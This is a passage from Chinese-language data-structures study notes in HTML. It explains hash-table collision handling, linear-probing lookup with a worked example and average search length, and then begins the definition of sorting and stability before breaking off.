<p>在开放定址的情形下，不能随便物理删除表中的已有元素，因为若删除元素，则会截断其他具有相同散列地址的元素的查找地址。因此，要删除一个元素时，可给它做一个删除标记，进行逻辑删除。但这样做的副作用是：执行多次删除后，表面上看起来散列表很满，实际上有许多位置未利用，因此需要定期维护散列表，要把删除标记的元素物理删除</p>
</div>
</li>
<li>
<p><strong>拉链法（链接法，chaining）</strong></p>
<p>显然，对于不同的关键字可能会通过散列函数映射到同一地址，为了避免非同义词发生冲突，可以把所有的同义词存储在一个线性链表中，这个线性链表由其散列地址唯一标识。假设散列地址为 <code>i</code> 的同义词链表的头指针存放在散列表的第 <code>i</code> 个单元中，因而查找、插入和删除操作主要在同义词链中进行。拉链法适用于经常进行插入和删除的情况。</p>
</li>
</ol>
<h4> 散列查找及性能分析</h4>
<p>散列表的查找过程与构造散列表的过程基本一致。对于一个给定的关键字 <code>key</code>，根据散列函数可以计算出其散列地址，执行步骤如下:</p>
<p>初始化：<code>Addr = Hash(key);</code></p>
<ol>
<li>检测查找表中地址为 Addr 的位置上是否有记录，若无记录，返回查找失败；若有记录，比较它与 <code>key</code> 的值，若相等，则返回查找成功标志，否则执行步骤 <code>2</code>。</li>
<li>用给定的处理冲突方法计算 “下一个散列地址”，并把 <code>Addr</code> 置为此地址，转入步骤 <code>1</code>。</li>
</ol>
<p>例如，关键字序列 <code>{19, 14, 23, 01, 68, 20, 84, 27, 55, 11, 10, 79}</code> 按散列函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">%</mi><mn>13</mn></mrow><annotation encoding="application/x-tex">H(key) = key \% 13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9444em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mord">%13</span></span></span></span> 和线性探测处理冲突构造所得的散列表 <code>L</code> 如下图所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">0</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
<th style="text-align:center">7</th>
<th style="text-align:center">8</th>
<th style="text-align:center">9</th>
<th style="text-align:center">10</th>
<th style="text-align:center">11</th>
<th style="text-align:center">12</th>
<th style="text-align:center">13</th>
<th style="text-align:center">14</th>
<th style="text-align:center">15</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">14</td>
<td style="text-align:center">01</td>
<td style="text-align:center">68</td>
<td style="text-align:center">27</td>
<td style="text-align:center">55</td>
<td style="text-align:center">19</td>
<td style="text-align:center">20</td>
<td style="text-align:center">84</td>
<td style="text-align:center">79</td>
<td style="text-align:center">23</td>
<td style="text-align:center">11</td>
<td style="text-align:center">10</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>给定值 84 的查找过程为：首先求得散列地址 <code>H(84) = 6</code>，因 <code>L[6]</code> 不空且 <code>L[6] ≠ 84</code>，则找第一次冲突处理后的地址 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>6</mn><mo>+</mo><mi>l</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mn>16</mn><mo>=</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">H_{1} = (6 + l) \% 16 = 7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mord">%16</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>，而 <code>L[7]</code> 不空且 <code>L[7] ≠ 84</code>，则找第二次冲突处理后的地址 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>6</mn><mo>+</mo><mn>2</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mn>16</mn><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">H_{2} = (6 + 2) \% 16 = 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mord">%16</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span>，<code>L[8]</code> 不空且 <code>L[8] = 84</code>，查找成功，返回记录在表中的序号 <code>8</code>。</p>
<p>给定值 38 的查找过程为：先求散列地址 <code>H(38) = 12</code>，<code>L[12]</code> 不空且 <code>L[12] ≠ 38</code>，则找下一地址 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>12</mn><mo>+</mo><mi>l</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mn>16</mn><mo>=</mo><mn>13</mn></mrow><annotation encoding="application/x-tex">H_{1} = (12 + l) \% 16 = 13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mord">%16</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">13</span></span></span></span>，由于 <code>L[13]</code> 是空记录，故表中不存在关键字为 <code>38</code> 的记录。</p>
<p>查找各关键字的比较次数如下图所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">关键字</th>
<th style="text-align:center">14</th>
<th style="text-align:center">01</th>
<th style="text-align:center">68</th>
<th style="text-align:center">27</th>
<th style="text-align:center">55</th>
<th style="text-align:center">19</th>
<th style="text-align:center">20</th>
<th style="text-align:center">84</th>
<th style="text-align:center">79</th>
<th style="text-align:center">23</th>
<th style="text-align:center">11</th>
<th style="text-align:center">10</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">比较次数</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">4</td>
<td style="text-align:center">3</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">3</td>
<td style="text-align:center">9</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">3</td>
</tr>
</tbody>
</table>
<p>平均查找长度 ASL 为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>×</mo><mn>6</mn><mo>+</mo><mn>2</mn><mo>+</mo><mn>3</mn><mo>×</mo><mn>3</mn><mo>+</mo><mn>4</mn><mo>+</mo><mn>9</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>12</mn><mo>=</mo><mn>2.5</mn></mrow><annotation encoding="application/x-tex">ASL = (1 \times 6 + 2 + 3 \times 3 + 4 + 9) / 12 = 2.5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">9</span><span class="mclose">)</span><span class="mord">/12</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2.5</span></span></span></span></p>
<p>对同一组关键字，设定相同的散列函数，则不同的处理冲突的方法得到的散列表不同，它们的平均查找长度也不同，本例与上节采用拉链法的平均查找长度不同。</p>
<p>从散列表的查找过程可见：</p>
<ol>
<li>虽然散列表在关键字与记录的存储位置之间建毛了直接映像，但由于 “冲突” 的产生，使得散列表的查找过程仍然是一个给定值和关键字进行比较的过程。因此，仍需要以平均查找长度作为衡量散列表的查找效率的度量。</li>
<li>散列表的查找效率取决于三个因素：散列函数、处理冲突的方法和装填因子。</li>
</ol>
<p>装填因子。散列表的装填因子一般记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span>，定义为一个表的装满程度，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mtext>表中记录数</mtext><mi>n</mi></mrow><mrow><mtext>散列表长度</mtext><mi>m</mi></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\alpha = \dfrac{\text{表中记录数} n}{\text{散列表长度} m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0463em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">散列表长度</span></span><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">表中记录数</span></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>散列表的平均查找长度依赖于散列表的装填因子 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span>，而不直接依赖于 <code>n</code> 或 <code>m</code>。直观地看，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span> 越大，表示装填的记录越 “满”，发生冲突的可能性越大，反之发生冲突的可能性越小。</p>
<h2> 排序</h2>
<h3> 排序的基本概念</h3>
<p><strong>排序</strong>，就是重新排列表中的元素，使表中的元素满足按关键字有序的过程。为了查找方便，通常希望计算机中的表是按关键字有序的。<strong>排序的确切定义如下：</strong></p>
<ul>
<li><strong>输入</strong>：<code>n</code> 个记录 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>R</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>R</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">R_{1}, R_{2}, \dotsc, R_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，对应的关键字为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>K</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">K_{1}, K_{2}, \dotsc, K_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li>
<li><strong>输出</strong>：输入序列的一个重排 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>R</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><msubsup><mi>R</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msubsup><mi>R</mi><mi>n</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">R_{1}', R_{2}', \dotsc, R_{n}'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4519em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4519em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>，使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>K</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>⩽</mo><msubsup><mi>K</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>⩽</mo><mo>…</mo><mo>⩽</mo><msubsup><mi>K</mi><mi>n</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">K_{1}' \leqslant K_{2}' \leqslant \dotsc \leqslant K_{n}'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4519em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4519em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9989em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.453em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>（其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩽</mo></mrow><annotation encoding="application/x-tex">\leqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mrel amsrm">⩽</span></span></span></span> 可以换成其他的比较大小的符号）。</li>
</ul>
<p><strong>算法的稳定性</strong>。若待排序表中有两个元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span 